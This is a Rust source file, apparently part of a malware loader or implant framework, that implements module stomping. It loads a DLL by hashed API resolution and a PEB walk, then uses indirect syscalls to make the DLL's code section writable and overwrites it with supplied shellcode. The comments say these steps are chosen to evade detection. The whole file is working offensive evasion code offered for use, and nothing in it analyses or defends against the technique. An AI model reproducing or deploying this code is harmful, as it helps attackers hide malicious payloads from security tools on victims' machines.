#[cfg(target_os = "windows")]
#[repr(C)]
struct UnicodeString {
    length:         u16,
    maximum_length: u16,
    _pad:           u32,
    buffer:         *mut u16,
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
    use crate::resolve::api_hash::h;
    let ntdll = peb_get_module_base(h::DLL_NTDLL);
    if ntdll.is_null() { return; }
    let ldr_fn = match resolve_by_hash(ntdll, h::LDR_LOAD) {
        Some(p) => p, None => return,
    };
    let ascii_len = dll_name.iter().take_while(|&&b| b != 0).count();
    let ascii = &dll_name[..ascii_len];
    let mut wide: [u16; 64] = [0u16; 64];
    let len = ascii.len().min(63);
    for (i, &b) in ascii.iter().take(len).enumerate() { wide[i] = b as u16; }
    let byte_len = (len * 2) as u16;
    let mut us = UnicodeString { length: byte_len, maximum_length: byte_len + 2, _pad: 0, buffer: wide.as_mut_ptr() };
    type LdrLoadDllFn = unsafe extern "system" fn(*mut u16, *mut u32, *mut UnicodeString, *mut usize) -> i32;
    let f: LdrLoadDllFn = core::mem::transmute(ldr_fn);
    let mut handle: usize = 0;
    f(core::ptr::null_mut(), core::ptr::null_mut(), &mut us, &mut handle);
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
    windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name.as_ptr());
}

#[cfg(target_os = "windows")]
pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
    use crate::evasion::{syscalls::get_ssn_h, unhook::get_text_section};
    use crate::resolve::api_hash::h;
    #[cfg(target_arch = "x86_64")]
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};

    // Force the target DLL to be loaded via LdrLoadDll (ntdll export, no kernel32 IAT).
    ldr_load_dll_by_name(dll_name);

    // Walk PEB to resolve base — avoids GetModuleHandleA in the IAT.
    #[cfg(target_arch = "x86_64")]
    let module_base: *mut u8 = {
        let clean: Vec<u8> = dll_name.iter().take_while(|&&b| b != 0).copied().collect();
        peb_get_module_base(djb2_hash_lower(&clean)) as *mut u8
    };
    #[cfg(not(target_arch = "x86_64"))]
    let module_base: *mut u8 = {
        windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(dll_name.as_ptr()) as *mut u8
    };

    if module_base.is_null() { return None; }

    let (text_rva, text_size) = get_text_section(module_base as *const u8);
    if text_size < shellcode.len() { return None; }

    let target = module_base.add(text_rva);

    let (ssn, tramp) = get_ssn_h(h::NT_PROT_VM)?;
    let ph: usize = usize::MAX; // -1 = current process

    let mut base  = target as usize;
    let mut sz    = shellcode.len();
    let mut old_p = 0u32;

    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp, ph,
        &mut base as *mut usize as usize,
        &mut sz   as *mut usize as usize,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old_p as *mut u32 as usize, 0,
    );

    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, shellcode.len());

    let mut base2 = target as usize;
    let mut sz2   = shellcode.len();
    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp, ph,
        &mut base2 as *mut usize as usize,
        &mut sz2   as *mut usize as usize,
        0x20, // PAGE_EXECUTE_READ
        &mut old_p as *mut u32 as usize, 0,
    );

    Some(target)
}
